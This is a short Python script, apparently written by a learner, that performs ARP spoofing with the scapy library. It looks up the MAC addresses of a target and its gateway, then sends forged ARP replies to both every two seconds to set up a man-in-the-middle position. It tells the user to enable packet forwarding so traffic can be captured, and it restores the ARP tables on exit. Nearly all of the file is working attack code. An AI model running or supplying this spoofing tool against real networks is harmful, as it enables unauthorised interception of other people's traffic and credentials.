import scapy.all as scapy
import time 

#ARP spoofing/poisoning



#02:11:22:33:44:55

#tired of being the only one chasing
#change mac function for linux

def get_mac(target_ip):
    #creatign an ARP request with target ip
    arp_reqest = scapy.ARP(pdst=target_ip)
    #creating an Ether frame to broadcast the request with tatget ip
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #combining via '/'
    arp_request_broadcast = broadcast / arp_reqest 
    #srp is a func that sends/recieves packets on Layer 2
    #sends arp_request_broadcast packet, waits for an answer for 5 sec and returns only answers ([0]) 
    # [0] - answers; [1] unanswered
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    
    # answered list:

    # [
    # (sent_packet, received_packet),
    # (sent_packet, received_packet),
    # ]

    for sent, received in answered_list:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip, spoof_target_mac):
    # op 2 - reply
    arp_reply = scapy.ARP(
        op = 2,
        pdst = target_ip,
        hwdst = spoof_target_mac,
        psrc = spoof_ip
    )

    scapy.send(arp_reply, verbose = False)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac
    )
    scapy.send(packet, verbose=False)


print("NOTE: Enable Packet Forwarding to capture packets")
print("NOTE: Only one addres at time")

print("[*] Enter your target IP: ")
target_ip = input()
target_mac = get_mac(target_ip)
print("[*] Target's MAC-Address:"+ target_mac)

print("[*] Enter your gateway's IP: ")
gateway_ip = input()
gateway_mac = get_mac(gateway_ip)
print("[*] Gateway's MAC-Address:"+ gateway_mac)

try:
    packets_count = 0
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        packets_count = packets_count + 2
        print("[*] Packets sent:" + str(packets_count)) 
        time.sleep(2)

except: 
    print("\nCtrl + C pressed.............Exiting")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[+] Arp Spoof Stopped")


